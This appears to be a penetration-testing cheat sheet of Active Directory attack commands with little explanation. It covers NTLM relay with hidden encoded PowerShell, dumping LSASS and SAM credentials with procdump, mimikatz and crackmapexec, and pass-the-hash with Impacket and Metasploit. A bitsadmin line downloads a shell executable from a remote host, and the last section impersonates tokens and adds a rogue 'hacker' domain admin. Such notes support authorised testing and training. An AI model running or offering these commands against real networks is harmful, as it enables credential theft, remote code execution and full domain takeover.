# Active Directory

## NTLM Relay Attack

```text
cme --timeout 5 --verbose smb 172.0.0.1/24 --gen-relay-list targets.txt
```

```text
python RunFinger.py -g -i 172.0.0.1/24
```

```text
python Responder.py -I <interface> -r -d -w
```

```text
echo "powershell_command_string" | iconv --to-code UTF-16LE | base64 -w 0
```

```text
ntlmrelayx.py -tf targets.txt -c 'powershell.exe -NoP -sta -NonI -W Hidden -Enc {base64_code}'
```

```text
ntlmrelayx.py -tf targets.txt -c <Empire Powershell launcher>
```

## Check Password Policy on Network Domain

* [https://www.wikigain.com/configuring-password-policies-with-windows-server-2016/](https://www.wikigain.com/configuring-password-policies-with-windows-server-2016/)

```text
gpedit.msc
```

Now go to `Computer Configuration/Windows Settings/Security Settings/Password Policy`

## Dump LSASS

* [https://medium.com/@markmotig/some-ways-to-dump-lsass-exe-c4a75fdc49bf](https://medium.com/@ali.bawazeeer/using-mimikatz-to-get-cleartext-password-from-offline-memory-dump-76ed09fd3330)

```text
C:\\temp\\procdump.exe -accepteula  -ma lsass.exe lsass.dmp
#For 32 bits


C:\\temp\\procdump.exe -accepteula -64 -ma lsass.exe  lsass.dmp  
#For 64 bits
```

Download the file lsass.dmp generated.Launch mimikatz against the lsass.dmp file with the commands:

```text
mimikatz # sekurlsa::minidump lsass.dmp
Switch to MINIDUMP

mimikatz # sekurlsa::logonPasswords full



# use with -r to clone and then dump LSASS
procdump -accepteula -r -ma lsass.exe lsass.dmp
```

## Dumping SAM

### Dump Sam File

```text
crackmapexec smb 10.0.0.75 -d ADMIN -u JSMITH -p 'P@ssWord!' --sam
```

### Check for Local Account Credential Reuse with SAM file hash

```text
crackmapexec smb /root/Desktop/networks.txt -d WORKGROUP -u Administrator -H <LM:NTLM HASH>
```

## Network Share Auditing

* [https://github.com/Dionach/ShareAudit/blob/master/README.md](https://github.com/Dionach/ShareAudit/blob/master/README.md)

## Impacket Tools

### WMIEXEC

```text
./wmiexec.py -hashes <NTLM Hash> Administrator@10.0.4.21
```

### Secrets Dump

```text
impacket-secretsdump -hashes <LTM:NTLM Hash> -just-dc insecuredomain.local/Administrator\$@10.0.64.22
```

### SMBEXEC

```text
/usr/local/bin/smbexec.py -hashes <LM:NTLM Hash> Administrator@10.0.65.81
```

## PowerShell Execution Policy Disable:

```text
powershell.exe -exec bypass -nop
```

## Bitsadmin

```text
bitsadmin /transfer myDownloadJob /download /priority normal http://10.0.65.37:8000/shell1.exe c:\shell1.exe
```

## Python Web Server

```text
python –m SimpleHTTPServer
```

## Escalation to Domain Admin

### After compromising a Windows machine:

### List the domain administrators from a command prompt:

```text
net group "Domain Admins" /domain
```

### Dump the hashes \(Metasploit\)

```text
msf > run post/windows/gather/smart_hashdump GETSYSTEM=FALSE
```

### Find the admins \(Metasploit\)

```text
spool /tmp/enumdomainusers.txt
msf > use auxiliary/scanner/smb/smb_enumusers_domain
msf > set smbuser Administrator
msf > set smbpass <LM:NTLM Hash>
msf > set rhosts 10.0.0.0/24
msf > set threads 8
msf > run
msf> spool off
```

### Compromise Admin's box

```text
meterpreter > load incognito
meterpreter > list_tokens -u
meterpreter > impersonate_token MYDOMAIN\\\\adaministrator
meterpreter > getuid
meterpreter > shell
```

```text
C:\\> whoami
mydom\\adaministrator
C:\\> net user hacker /add /domain
C:\\> net group "Domain Admins" hacker /add /domain
```

## References:

* [https://medium.com/@markmotig/some-ways-to-dump-lsass-exe-c4a75fdc49bf](https://medium.com/@markmotig/some-ways-to-dump-lsass-exe-c4a75fdc49bf)
* [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/network-vs-interactive-logons\#interactive-logon-2-via-runas-and-domain-account](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/network-vs-interactive-logons#interactive-logon-2-via-runas-and-domain-account)
* [https://www.bleepingcomputer.com/news/microsoft/microsoft-defender-can-ironically-be-used-to-download-malware/](https://www.bleepingcomputer.com/news/microsoft/microsoft-defender-can-ironically-be-used-to-download-malware/)
* [https://medium.com/@ali.bawazeeer/using-mimikatz-to-get-cleartext-password-from-offline-memory-dump-76ed09fd3330](https://medium.com/@ali.bawazeeer/using-mimikatz-to-get-cleartext-password-from-offline-memory-dump-76ed09fd3330)
* [https://1337red.wordpress.com/building-and-attacking-an-active-directory-lab-with-powershell/](https://1337red.wordpress.com/building-and-attacking-an-active-directory-lab-with-powershell/)
* [https://wiki.wizard32.net/xwiki/bin/view/Penetration Testing\_Red Teaming/NTLM Relay Attack/](https://wiki.wizard32.net/xwiki/bin/view/Penetration%20Testing_Red%20Teaming/NTLM%20Relay%20Attack/)
* h[ttps://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html](https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html)
* [https://www.varonis.com/blog/pen-testing-active-directory-environments-part-introduction-crackmapexec-powerview/](https://www.varonis.com/blog/pen-testing-active-directory-environments-part-introduction-crackmapexec-powerview/)



